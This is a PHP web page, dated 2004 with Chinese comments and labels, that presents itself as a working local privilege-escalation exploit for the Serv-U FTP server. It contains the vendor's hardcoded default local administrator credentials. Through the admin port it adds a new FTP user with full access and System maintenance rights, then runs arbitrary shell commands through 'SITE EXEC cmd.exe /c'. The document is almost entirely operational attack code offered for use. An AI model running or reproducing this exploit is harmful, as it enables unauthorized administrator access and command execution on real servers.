<?PHP
/*******************************************************************************
|                Serv-U All Version Local Exploit Ver 1.5                      |
|------------------------------------------------------------------------------|
|                       Codez By 我非我[F.S.T]                                 |
|             My QQ: 309088292  E-mail: wofeiwo@bugkidz.org                    |
|                  Team: Firefox Security Team [F.S.T]                         |
|                   Welcome to: http://www.wrsky.com                           |
*******************************************************************************/
//
//Codez begin
//
//判断magic_quotes_gpc的值
if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
}

//变量初始化
$addr = '0.0.0.0';
$ftpport = 21;
$adminport = 43958;
$adminuser = 'LocalAdministrator';
$adminpass = '#l@$ak#.lk;0@P';
$user = 'wofeiwo';
$password = 'wrsky';
$homedir = 'C:\\';
$dir = 'C:\\WINNT\\System32\\';

//有改变则赋值
if ($_GET){
    $addr = $_GET['addr'] ;
    $ftpport = $_GET['ftpport'] ;
    $adminport = $_GET['adminport'] ;
    $adminuser = $_GET['adminuser'] ;
    $adminpass = $_GET['adminpass'] ;
    $user = $_GET['user'] ;
    $password = $_GET['password'] ;
    $homedir = $_GET['homedir'] ;
    if ($_GET['dir']){
        $dir = $_GET['dir'] ;
    }
}
?>

<!-- 主文件开始 //-->
<html>
<head>
<title>-=<Serv-U All Version本地提升权限Exp10it Ver 1.5 By 我非我[F.S.T] 火狐技术联盟荣誉出品>=-</title>
<meta content="text/html; charset=gb2312" http-equiv="Content-Type">
<STYLE TYPE="text/css">
b {font-family : Verdana, sans-serif;font-size : 14px;}
body,td,p,pre {
font-family : Verdana, sans-serif;font-size : 12px;
}
input {
			font-family: "Verdana";
			font-size: "11px";
			BACKGROUND-COLOR: "#FFFFFF";
			height: "18px";
			border: "1px solid #666666";
		}
</STYLE>
</head>
<body bgcolor="#EEEEEE" text="#000000" link="#006699" vlink="#5493B4">

<center><b>Serv-U All Version本地提升权限Exp10it Ver 1.5</b>
<br><br>
<b>添加Serv-U用户部分</b>
<br>
<form action="<?=$_SERVER['PHP_SELF']?>" method="get">
<table width="660" border="0" cellpadding="0">
<tr><td width="300" align="center">主机IP：</td>   <td width="360" align="center"><input name="addr" type="text" class="INPUT" value="<?=$addr?>"></td></tr>
<tr><td width="300" align="center">主机Ftp端口：</td>   <td width="360" align="center"><input name="ftpport" type="text" class="INPUT" value="<?=$ftpport?>"></td></tr>
<tr><td width="300" align="center">主机Ftp管理端口：</td>   <td width="360" align="center"><input name="adminport" type="text" class="INPUT" value="<?=$adminport?>"></td></tr>
<tr><td width="300" align="center">主机Ftp管理用户：</td>   <td width="360" align="center"><input name="adminuser" type="text" class="INPUT" value="<?=$adminuser?>"></td></tr>
<tr><td width="300" align="center">主机Ftp管理密码：</td>   <td width="360" align="center"><input name="adminpass" type="text" class="INPUT" value="<?=$adminpass?>"></td></tr>
<tr><td width="300" align="center">添加的用户名：</td>   <td width="360" align="center"><input name="user" type="text" class="INPUT" value="<?=$user?>"></td></tr>
<tr><td width="300" align="center">添加的用户名密码：</td><td width="360" align="center"><input name="password" type="password" class="INPUT" value="<?=$password?>"></td></tr>
<tr><td width="300" align="center">用户主目录(别忘了写"\")：</td>  <td width="360" align="center"><input name="homedir" type="text" class="INPUT" value="<?=$homedir?>"></td></tr>
<tr><td width="300" align="center"><input name="action" type="hidden" value="up"></td></tr>
<tr><td width="300" align="center"><input type="submit" class="INPUT" value="添加"></td></tr>
</form></tr>
</table>
<hr width="660"><br>
<textarea cols="60" rows="10" readonly>命令回显:
<?php

//添加用户
if ($_GET['action']=="up"){
    up($addr,$ftpport,$adminport,$adminuser,$adminpass,$user,$password,$homedir);
    }
    ?>
</textarea></center><br><hr width="660">
<center><b>执行命令部分</b><br>
<form action="<?=$_SERVER['PHP_SELF']?>" method="get">
<table width="660" border="0" cellpadding="0">
<tr><td width="300" align="center">主机Ftp端口：</td>   <td width="360" align="center"><input name="ftpport" type="text" class="INPUT" value="<?=$ftpport?>"></td></tr>
<tr><td width="300" align="center">用户名：</td>   <td width="360" align="center"><input name="user" type="text" class="INPUT" value="<?=$user?>"></td></tr>
<tr><td width="300" align="center">用户名密码：</td><td width="360" align="center"><input name="password" type="password" class="INPUT" value="<?=$password?>"></td></tr>
<tr><td width="300" align="center">系统路径(别忘了写"\")：</td><td width="360" align="center"><input name="dir" type="text" class="INPUT" value="<?=$dir?>"></td></tr>
<tr><td width="300" align="center">执行的命令：</td>  <td width="360" align="center"><input name="cmd" type="text" class="INPUT" value="<?=$_GET['cmd']?>"></td></tr>
<tr><td width="300" align="center"><input name="action" type="hidden" value="execute"></td></tr>
<tr><td width="300" align="center"><input type="submit" class="INPUT" value="执行"></td></tr>
</form></tr></table><hr width="660"><br>
<textarea cols="60" rows="10" readonly>命令回显:
<?php

//执行命令
if ($_GET['action']=="execute"){
    ftpcmd($ftpport,$user,$password,$dir,$_GET['cmd']);
    }
?>
</textarea>
</center><br><hr width="660">
<i><center>Copycenter (C) 2004 我非我 All centers Reserved. 火狐技术联盟：<a href="http://www.wrsky.com" target="_blank">Http://Www.WrSky.Com</a> .<br>
My QQ:309088292<br>
E-Mail:<a href="mailto:WoFeiWo@BugKidz.Org">WoFeiWo@BugKidz.Org</a>
</center></i>
</body>
</html>
<!-- 主文件结束 //-->
<?php

//添加用户主函数定义
function up($addr,$ftpport,$adminport,$adminuser,$adminpass,$user,$password,$homedir){
     $fp = fsockopen ("127.0.0.1", $adminport, $errno, $errstr, 8);
     if (!$fp) {
         echo "$errstr ($errno)<br>\n";
         } else {
    fputs ($fp, "USER ".$adminuser."\r\n");
    sleep (1);
    fputs ($fp, "PASS ".$adminpass."\r\n");
    sleep (1);
    fputs ($fp, "SITE MAINTENANCE\r\n");
    sleep (1);
    fputs ($fp, "-SETUSERSETUP\r\n");
    fputs ($fp, "-IP=".$addr."\r\n");
    fputs ($fp, "-PortNo=".$ftpport."\r\n");
    fputs ($fp, "-User=".$user."\r\n");
    fputs ($fp, "-Password=".$password."\r\n");
    fputs ($fp, "-HomeDir=".$homedir."\r\n");
    fputs ($fp, "-LoginMesFile=\r\n");
    fputs ($fp, "-Disable=0\r\n");
    fputs ($fp, "-RelPaths=0\r\n");
    fputs ($fp, "-NeedSecure=0\r\n");
    fputs ($fp, "-HideHidden=0\r\n");
    fputs ($fp, "-AlwaysAllowLogin=0\r\n");
    fputs ($fp, "-ChangePassword=1\r\n");
    fputs ($fp, "-QuotaEnable=0\r\n");
    fputs ($fp, "-MaxUsersLoginPerIP=-1\r\n");
    fputs ($fp, "-SpeedLimitUp=-1\r\n");
    fputs ($fp, "-SpeedLimitDown=-1\r\n");
    fputs ($fp, "-MaxNrUsers=-1\r\n");
    fputs ($fp, "-IdleTimeOut=600\r\n");
    fputs ($fp, "-SessionTimeOut=-1\r\n");
    fputs ($fp, "-Expire=0\r\n");
    fputs ($fp, "-RatioUp=1\r\n");
    fputs ($fp, "-RatioDown=1\r\n");
    fputs ($fp, "-RatiosCredit=0\r\n");
    fputs ($fp, "-QuotaCurrent=0\r\n");
    fputs ($fp, "-QuotaMaximum=0\r\n");
    fputs ($fp, "-Maintenance=System\r\n");
    fputs ($fp, "-PasswordType=Regular\r\n");
    fputs ($fp, "-Ratios=None\r\n");
    fputs ($fp, " Access=".$homedir."|RWAMELCDP\r\n");
    fputs ($fp, "QUIT\r\n");
    sleep (1);
    while (!feof($fp)) {
        echo fgets ($fp,128);
    }

}
}

//执行命令主函数定义
function ftpcmd($ftpport,$user,$password,$dir,$cmd){

$conn_id = fsockopen ("127.0.0.1", $ftpport, $errno, $errstr, 8);

if (!$conn_id) {
    echo "$errstr ($errno)<br>\n";
} else {
    fputs ($conn_id, "USER ".$user."\r\n");
    sleep (1);
    fputs ($conn_id, "PASS ".$password."\r\n");
    sleep (1);
    fputs ($conn_id, "SITE EXEC ".$dir."cmd.exe /c ".$cmd."\r\n");
    fputs ($conn_id, "QUIT\r\n");
    sleep (1);
    while (!feof($conn_id)) {
        echo fgets ($conn_id,128);
    }
    fclose($conn_id);
}
}

//去除转义字符
function stripslashes_array(&$array) {
 while (list($key,$var) = each($array)) {
  if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
   if (is_string($var)) {
    $array[$key] = stripslashes($var);
   }
   if (is_array($var))  {
    $array[$key] = stripslashes_array($var);
   }
  }
 }
 return $array;
}
?>

